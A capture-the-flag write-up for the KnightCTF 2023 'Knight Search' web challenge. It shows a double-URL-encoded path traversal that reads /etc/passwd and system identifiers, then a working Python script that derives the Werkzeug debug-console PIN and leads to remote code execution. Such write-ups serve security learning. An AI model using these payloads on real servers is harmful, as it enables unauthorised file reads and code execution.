# Knight Search

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

- Challenge static score: 100

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121144204.png)

## Find the flag

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121144229.png)

According to the challenge's description, the web application's backend is using **Flask framework**, which is written in Python. Also, **we can search files in the web application**.

**View source page:**
```html
[...]
<div class="container" style="width: 35%; margin-top: 125px;">
    <form action="/home" method="POST">
        <div class="form-group">
            <h3>Ahhh....</h3>
            <input name="filename" type="text" class="form-control" id="filename" aria-describedby="emailHelp" placeholder="Ahhhh......">
            <button type="submit" class="btn btn-primary" style="margin-top:10px">Ahhh......</button>
            <!-- I was just confused to name these :')' -->
        </div>
    </form>
<div class="alert alert-primary" role="alert" style="margin-top: 12px;">
[...]
```

When we clicked the submit button, **it'll send a POST request to `/home`, with parameter `filename`.**

Whenever I deal with this searching files functions, **I always will try Path Traversal/Directory Traversal , Local File Inclusion (LFI), Remote File Inclusion (RFI), Server-Side Request Forgery (SSTI) and more.**

Let's try to search some files:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121144739.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121144745.png)

**Hmm... What if I send a POST request non-existence parameter?**

To do so, I'll intercept and modify the request via Burp Suite:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121145505.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121145745.png)

We've triggered an exception error!

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121145828.png)

In the error output, we see it's missing a key (parameter) called `filename`.

**Also, in Werkzeug Debug mode, we can view some of the source code:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121145913.png)

```py
return render_template("index.html")

 
@app.route("/home", methods=['POST'])
def home():
    filename = urllib.parse.unquote(request.form['filename'])
    data = "Try Harder....."
    naughty = "../"
    if naughty not in filename:
        filename = urllib.parse.unquote(filename)
        if os.path.isfile(current_app.root_path + '/'+ filename):
```

Let's break it down!

- There is a route (path) called `/home`, and it only allow POST method:
    - Parameter `filename` will be URL decoded
    - If `../` IS NOT in the parameter `filename`, it'll check our supplied `filename` value is a valid file or not.

Armed with above information, we can try to **double URL encode to bypass the `../`**. This could allow us to do **path traversal**, and thus read any files on the local system.

- `../` double URL encoded: `%252E%252E%252F`

> Note: You can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)) to do that.

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121150700.png)

Boom! We can read local files!!!!

Let's read the flag file!

**By reading the content of `/etc/passwd` file, we found that there is a user called `yooboi`:**
```
[...]
yooboi:x:1000:1000::/home/yooboi:/bin/sh
```

**Let's try to read the flag file in his home directory!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121151226.png)

Nope...

**Hmm... Let's read the web application's Flask source code to have a better understanding of the code flow:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121152211.png)

```py
from flask import Flask, request, render_template, current_app
import os, urllib


app = Flask(__name__)

@app.route("/")

def start():
    return render_template("index.html")


@app.route("/home", methods=['POST'])
def home():
    filename = urllib.parse.unquote(request.form['filename'])
    data = "Try Harder....."
    naughty = "../"
    if naughty not in filename:
        filename = urllib.parse.unquote(filename)
    if os.path.isfile(current_app.root_path + '/'+ filename):
        with current_app.open_resource(filename) as f:
            data = f.read()
    return render_template("index.html", read = data)



@app.errorhandler(404)
def ahhhh(e):
    return render_template("ahhh.html")


if __name__ == "__main__":
 app.run(host='0.0.0.0', port=7777 , debug=True)
```

Nothing useful.

Since we can read local files, why not reading Werkzeug's console PIN code, and **use it's console to get Remote Code Execution**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121153223.png)

According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit), we can calculate the PIN code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121153505.png)

Also, [this writeup](https://ctftime.org/writeup/17955) could be helpful too:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121153556.png)

- username: `yooboi` (From `/etc/passwd`)
- modname: `flask.app`
- `Flask`
- The absolute path of `app.py` in the flask directory: `/usr/local/lib/python3.9/site-packages/flask/app.py`

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121153953.png)

- MAC address: `02:42:ac:11:00:03` (From `/sys/class/net/eth0/address`)

Leaking network interface:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121154853.png)

Found network interface: `eth0`

Leaking MAC address:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121154926.png)

**Convert from hex address to decimal representation:**
```shell
┌[root♥siunam]-(~/ctf/KnightCTF-2023/Web/Knight-Search)-[2023.01.21|14:44:59(HKT)]
└> python3                  
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x0242ac110003)
2485377892355
```

- Machine ID: `e01d426f-826c-4736-9cd2-a96608b66fd8` (From `/proc/sys/kernel/random/boot_id`)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121154756.png)

**Then, we can use a Python script to generate the Werkzeug console PIN:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121155024.png)

```py
import hashlib
from itertools import chain
probably_public_bits = [
    'yooboi',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892355',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'e01d426f826c47369cd2a96608b66fd8'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

But the PIN code is wrong...

After around 3 hours of nothing. I found [this YouTube video writeup](https://www.youtube.com/watch?v=8dyoBfj7H8U), which helps me a LOT!

> Note: The `/etc/machine-id` and `/proc/self/cgroup` on the challenge machine are EMPTY, we can only have `/proc/sys/kernel/random/boot_id`. Also, the hashing algorithm MUST change to SHA1.

**Final public and private bits:**

- Public bits:
    - username: `yooboi` (From `/etc/passwd`)
    - modname: `flask.app`
    - `Flask`
    - The absolute path of `app.py` in the flask directory: `/usr/local/lib/python3.9/site-packages/flask/app.py`
- Private bits:
    - MAC address: `2485377892355`
    - **Boot ID: `e01d426f-826c-4736-9cd2-a96608b66fd8`**

**Final payload:**
```py
import hashlib
from itertools import chain
probably_public_bits = [
    'yooboi',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892355',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'e01d426f-826c-4736-9cd2-a96608b66fd8'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

```shell
┌[root♥siunam]-(~/ctf/KnightCTF-2023/Web/Knight-Search)-[2023.01.21|17:29:44(HKT)]
└> python3 solve.py
695-086-043
```

Let's try this PIN code!

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121173148.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121173425.png)

We're finally in!!!

**Let's use OS command and get the flag:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/KnightCTF-2023/images/Pasted%20image%2020230121173941.png)

- **Flag: `KCTF{n3v3r_run_y0ur_53rv3r_0n_d3bu6_m0d3}`**

# Conclusion

What we've learned:

1. Remote Code Execution (RCE) Via Werkzeug Debug Console & Bypassing Console PIN Code, Path Traversal Filter